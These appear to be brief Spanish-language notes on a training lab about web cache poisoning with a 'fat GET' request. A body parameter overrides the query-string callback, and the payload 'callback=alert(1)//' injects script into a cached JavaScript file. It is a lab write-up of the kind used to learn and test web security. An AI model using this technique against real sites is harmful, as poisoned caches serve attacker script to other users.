---
title: "8 - Web cache poisoning via a fat GET request"
---

# 8 - Web cache poisoning via a fat GET request

### Podemos usar find **FAT GET** 

Acepta parametros POST en una petición GET :

```HTTP
GET /js/geolocate.js

callback=test
```

```javascript
const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
test({"country":"United Kingdom"});
```

La cosa sería enviarlo con ambos, como argumento y en el body , se pondrá el del body

```HTTP
GET /js/geolocate.js?callback=setCountryCookie

callback=alert(1)//
```

```javascript
const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
alert(1)//({"country":"United Kingdom"});
```
